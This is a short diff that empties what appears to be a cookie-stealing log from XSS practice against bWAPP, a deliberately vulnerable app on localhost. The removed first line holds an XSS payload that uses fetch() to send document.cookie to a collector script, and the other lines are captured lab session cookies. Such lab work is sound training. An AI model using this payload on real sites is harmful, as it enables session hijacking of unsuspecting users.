@@ -1,10 +1,1 @@
-http://localhost/bWAPP/bWAPP/xss_eval.php?date=fetch(%27http://localhost/bWAPP/xss/get.php?cookie=${document.cookie}%27). Cookie la: ${document.cookie} 
-http://localhost/bWAPP/bWAPP/xss_stored_1.php. Cookie la: security_level=0; PHPSESSID=6tjnnicn6tgaddlm48gld763hc 
-http://localhost/bWAPP/bWAPP/xss_stored_1.php. Cookie la: security_level=0; PHPSESSID=hdnqv480unl13balok9c1ht2oa 
-http://localhost/bWAPP/bWAPP/xss_stored_1.php. Cookie la: security_level=0; PHPSESSID=f4uk84hh73fmb8208v4ia0uuk0 
-http://localhost/bWAPP/bWAPP/xss_stored_1.php. Cookie la: security_level=0; PHPSESSID=f4uk84hh73fmb8208v4ia0uuk0 
-http://localhost/bWAPP/bWAPP/xss_stored_1.php. Cookie la: security_level=0; PHPSESSID=f4uk84hh73fmb8208v4ia0uuk0 
-http://localhost/bWAPP/bWAPP/xss_stored_1.php. Cookie la: security_level=0; PHPSESSID=f4uk84hh73fmb8208v4ia0uuk0 
-http://localhost/bWAPP/bWAPP/xss_stored_1.php. Cookie la: security_level=0; PHPSESSID=f4uk84hh73fmb8208v4ia0uuk0 
-http://localhost/bWAPP/bWAPP/xss_stored_1.php. Cookie la: security_level=0; PHPSESSID=f4uk84hh73fmb8208v4ia0uuk0 
-http://localhost/bWAPP/bWAPP/xss_stored_1.php. Cookie la: security_level=0; PHPSESSID=f4uk84hh73fmb8208v4ia0uuk0 
+
